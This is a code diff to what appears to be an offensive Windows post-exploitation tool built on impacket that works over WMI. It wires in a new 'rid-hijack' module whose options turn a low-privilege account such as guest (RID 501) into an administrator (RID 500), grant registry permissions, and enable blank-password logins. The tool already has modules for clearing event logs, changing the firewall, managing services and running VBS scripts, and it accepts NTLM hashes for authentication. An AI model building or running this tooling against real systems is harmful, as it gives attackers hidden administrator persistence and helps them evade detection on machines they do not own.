@@ -15,6 +15,7 @@ from lib.modules.firewall import Firewall_Toolkit
 from lib.modules.eventlog_fucker import eventlog_Toolkit
 from lib.modules.service_mgr import Service_Toolkit
 from lib.methods.executeVBS import executeVBS_Toolkit
+from lib.modules.rid_hijack import RID_Hijack_Toolkit
 from impacket.examples import logger
 from impacket.examples.utils import parse_target
 from impacket import version
@@ -81,7 +82,7 @@ class WMIEXEC:
                     print("[-] Wrong operation")
 
             if self.__options.module == "filetransfer":
-                executer_Transfer = filetransfer_Toolkit(iWbemLevel1Login)
+                executer_Transfer = filetransfer_Toolkit(iWbemLevel1Login, dcom)
                 if all([self.__options.src_file and self.__options.dest_file]):
                     if self.__options.upload == True:
                         executer_Transfer.uploadFile(src_File=self.__options.src_file, dest_File=r'%s'%self.__options.dest_file)
@@ -137,7 +138,7 @@ class WMIEXEC:
                     print("[-] Wrong operation")
 
             if self.__options.module == "service":
-                executer_Service = Service_Toolkit(iWbemLevel1Login)
+                executer_Service = Service_Toolkit(iWbemLevel1Login, dcom)
                 if self.__options.action:
                     if self.__options.action == "create" and all([self.__options.service_name, self.__options.display_name, self.__options.bin_path]):
                         executer_Service.create_Service(self.__options.service_name, self.__options.display_name, self.__options.bin_path, self.__options._class)
@@ -158,6 +159,26 @@ class WMIEXEC:
                     executer_VBS.remove_Event(self.__options.remove)
                 else:
                     print("[-] Wrong operation")
+            
+            if self.__options.module == "rid-hijack":
+                RID_Hijack = RID_Hijack_Toolkit(iWbemLevel1Login, dcom)
+                if all([self.__options.query]):
+                    RID_Hijack.query_user(self.__options.query)
+                elif self.__options.action:
+                    if self.__options.action == "hijack" and all([self.__options.hijack_target and self.__options.hijack_rid]):
+                        RID_Hijack.hijack(self.__options.action, self.__options.hijack_target, self.__options.hijack_rid)
+                    elif self.__options.action in ['activate', 'deactivate'] and all([self.__options.hijack_target]):
+                        RID_Hijack.hijack(self.__options.action, self.__options.hijack_target)
+                    elif self.__options.action in ['grant', 'grant-old', 'retrieve', 'retrieve-old'] and all([self.__options.hijack_target]):
+                        RID_Hijack.Permissions_Controller(self.__options.action, self.__options.hijack_target)
+                elif self.__options.blank_pass_login:
+                    if self.__options.blank_pass_login == "enable":
+                        RID_Hijack.BlankPasswordLogin('enable')
+                    else:
+                        RID_Hijack.BlankPasswordLogin('disable')
+                else:
+                    print("[-] Wrong operation")
+
 
         except (Exception, KeyboardInterrupt) as e:
             if logging.getLogger().level == logging.DEBUG:
@@ -188,17 +209,17 @@ if __name__ == '__main__':
 
     group = parser.add_argument_group('authentication')
 
-    group.add_argument('-hashes', action="store", metavar="LMHASH:NTHASH", help='NTLM hashes, format is LMHASH:NTHASH')
-    group.add_argument('-no-pass', action="store_true", help='don\'t ask for password (useful for -k)')
-    group.add_argument('-k', action="store_true",
+    group.add_argument('-hashes', action='store', metavar="LMHASH:NTHASH", help='NTLM hashes, format is LMHASH:NTHASH')
+    group.add_argument('-no-pass', action='store_true', help='don\'t ask for password (useful for -k)')
+    group.add_argument('-k', action='store_true',
                        help='Use Kerberos authentication. Grabs credentials from ccache file '
                             '(KRB5CCNAME) based on target parameters. If valid credentials cannot be found, it will use the '
                             'ones specified in the command line')
-    group.add_argument('-aesKey', action="store", metavar="hex key", help='AES key to use for Kerberos Authentication '
+    group.add_argument('-aesKey', action='store', metavar="hex key", help='AES key to use for Kerberos Authentication '
                                                                           '(128 or 256 bits)')
     group.add_argument('-dc-ip', action='store', metavar="ip address", help='IP Address of the domain controller. If '
                                                                             'ommited it use the domain part (FQDN) specified in the target parameter')
-    group.add_argument('-keytab', action="store", help='Read keys for SPN from keytab file')
+    group.add_argument('-keytab', action='store', help='Read keys for SPN from keytab file')
 
     # enumerate.py
     enum_parser = subparsers.add_parser('enum', help='Enumerate system info')
@@ -255,7 +276,7 @@ if __name__ == '__main__':
 
     # service_mgr.py
     service_MgrParser = subparsers.add_parser('service', help='Service manager')
-    service_MgrParser.add_argument('-action', action="store", choices=['create', 'delete', 'start', 'stop', 'disable', 'auto-start', 'manual-start', 'getinfo'], 
+    service_MgrParser.add_argument('-action', action='store', choices=['create', 'delete', 'start', 'stop', 'disable', 'auto-start', 'manual-start', 'getinfo'], 
                                    help='Action you want to do.')
     service_MgrParser.add_argument('-service-name', action='store', help='Specify service name.')
     service_MgrParser.add_argument('-display-name', action='store', help='Specify service display name.')
@@ -266,10 +287,18 @@ if __name__ == '__main__':
 
     # executeVBS.py
     execute_VBSParser = subparsers.add_parser('execute-vbs', help='Execute vbs file.')
-    execute_VBSParser.add_argument('-vbs', action="store", help='VBS filename containing the script you want to run')
-    execute_VBSParser.add_argument('-filter', action="store", help='The WQL filter string that will trigger the script.')
+    execute_VBSParser.add_argument('-vbs', action='store', help='VBS filename containing the script you want to run')
+    execute_VBSParser.add_argument('-filter', action='store', help='The WQL filter string that will trigger the script.')
     execute_VBSParser.add_argument('-timer', action='store', help='The amount of milliseconds after the script will be triggered, 1000 milliseconds = 1 second')
-    execute_VBSParser.add_argument('-remove', action="store", help='Remove wmi event with ID.')
+    execute_VBSParser.add_argument('-remove', action='store', help='Remove wmi event with ID.')
+
+    # rid_hijack.py
+    rid_HijackParser = subparsers.add_parser('rid-hijack', help='RID Hijack.')
+    rid_HijackParser.add_argument('-query', action='store', help="Query user via username.")
+    rid_HijackParser.add_argument('-hijack-target', action='store', help='Specify users RID you want to hijack from.(Like guest user 501)')
+    rid_HijackParser.add_argument('-hijack-rid', action='store', help="Specify RID you want to hijack to.(Like administrator rid 500)")
+    rid_HijackParser.add_argument('-action', action='store', choices=['hijack', 'activate', 'deactivate', 'grant', 'grant-old', 'retrieve', 'retrieve-old'], help='Action you want to do.')
+    rid_HijackParser.add_argument('-blank-pass-login', action='store', choices=['enable', 'disable'], help='Enable or disable blank pass login.(for guest user)')
 
     if len(sys.argv) == 1:
         parser.print_help()
